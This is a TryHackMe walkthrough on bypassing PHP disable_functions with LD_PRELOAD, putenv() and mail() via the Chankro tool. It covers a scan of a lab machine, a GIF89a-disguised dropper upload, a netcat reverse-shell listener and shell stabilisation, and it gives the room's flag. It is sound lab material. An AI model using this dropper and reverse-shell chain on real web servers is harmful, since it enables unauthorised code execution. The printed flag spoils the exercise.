# Try Hack Me - Bypass Disable Functions
##### Practice bypassing disabled dangerous features that run operating system commands or start processes.

## Task 1 - Introduction 

##### What is a file upload vulnerability?

This vulnerability occurs in web applications where there is the possibility of uploading a file without being checked by a security system that curbs potential dangers.

It allows an attacker to upload files with code (scripts such as .php, .aspx and more) and run them on the same server, more information in this [room](https://tryhackme.com/room/uploadvulns).

##### Why this room?

Among the typically applied measures is disabling dangerous functions that could execute operating system commands or start processes. Functions such as system() or shell_exec() are often disabled through PHP directives defined in the php.ini configuration file. Other functions, perhaps less known as dl() (which allows you to load a PHP extension dynamically), can go unnoticed by the system administrator and not be disabled. The usual thing in an intrusion test is to list which functions are enabled in case any have been forgotten.

One of the easiest techniques to implement and not very widespread is to abuse the mail() and putenv() functionalities. This technique is not new, it was already reported to [PHP in 2008](https://bugs.php.net/bug.php?id=46741) by gat3way, but it still works to this day. Through the putenv() function, we can modify the environment variables, allowing us to assign the value we want to the variable LD_PRELOAD. Roughly LD_PRELOAD will allow us to pre-load a .so library before the rest of the libraries, so that if a program uses a function of a library (libc.so for example), it will execute the one in our library instead of the one it should. In this way, we can hijack or "hook" functions, modifying their behaviour at will.

[Chankro](https://github.com/TarlogicSecurity/Chankro): tool to evade disable_functions and open_basedir

Through Chankro, we generate a PHP script that will act as a dropper, creating on the server a .so library and the binary (a meterpreter, for example) or bash script (reverse shell, for example) that we want to execute freely, and that will later call putenv() and mail() to launch the process.

Install tool:
* git clone https://github.com/TarlogicSecurity/Chankro.git
* cd Chankro
* python2 chankro.py --help

```bash
python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
```

* --arch = Architecture of system victim 32 o 64.
* --input = file with your payload to execute
* --output = Name of the PHP file you are going to create; this is the file you will need to upload.
* --path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder DOCUMENTROOT + uploads.
![](https://i.imgur.com/LdyyDOn.png)

Now, when executing the PHP script in the web server, the necessary files will be created to execute our payload.
![](https://i.imgur.com/R5enl2U.png)

My command run successfully, and I created a file in the directory with the output of the command.

Credits.

All credit goes to [Tarlogic](https://www.tarlogic.com/blog/evadir-disable_functions-open_basedir/) for the script and explaining the method of the bypass.
```
Read the above.
> No answer needed
```

## Task 2 - Reasy Set Go 

Icon made by Pixel perfect from www.flaticon.com

##### Port scan.
```bash
sudo nmap -sS -v 10.10.225.4

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

##### Scan directories.
```bash
dirb http://10.10.225.4

+ http://10.10.225.4/index.html (CODE:200|SIZE:12012)                                                                                                      
+ http://10.10.225.4/phpinfo.php (CODE:200|SIZE:68235)                                                                                                     
+ http://10.10.225.4/server-status (CODE:403|SIZE:276)                                                                                                     
==> DIRECTORY: http://10.10.225.4/uploads/   
```

##### Checkout phpinfo.php for recon
```bash
http://10.10.225.4/phpinfo.php

# Document Root
/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db 
```

##### Create payload.
```bash
python chankro.py --arch 64 --input shell.sh --output shell.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

##### Add to beginning of tryhackme.php, to set magic number
```bash
GIF89a;
```

##### Establish Listener
```bash
bash # On Kali
rlwrap nc -lvnp 4444
```

##### Establish Reverse Shell
```bash
http://10.10.225.4/uploads/shell.php
```

##### Stabalize Shell
```bash
which python python2 python3
python3 -c "import pty; pty.spawn('/bin/bash')"; #spawn a python psuedo-shell
CTRL+Z # to background shell
stty raw -echo # Send control characters to the shell.
stty size # Get terminal window size 38 / 155
fg # foreground shell
export SHELL=bash
stty rows 38 columns 155 #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

##### Navigate
ls
cd ..
ls
cd ..
ls
<.....>
cd /home
ls
s4vi
cd s4vi
ls
flag.txt

cat flag.txt
thm{bypass_d1sable_functions_1n_php}
#####


```
Compromise the machine and locate the flag.txt
> thm{bypass_d1sable_functions_1n_php}
```

## Additional Resources
https://bugs.php.net/bug.php?id=46741

https://github.com/TarlogicSecurity/Chankro

https://www.tarlogic.com/blog/evadir-disable_functions-open_basedir/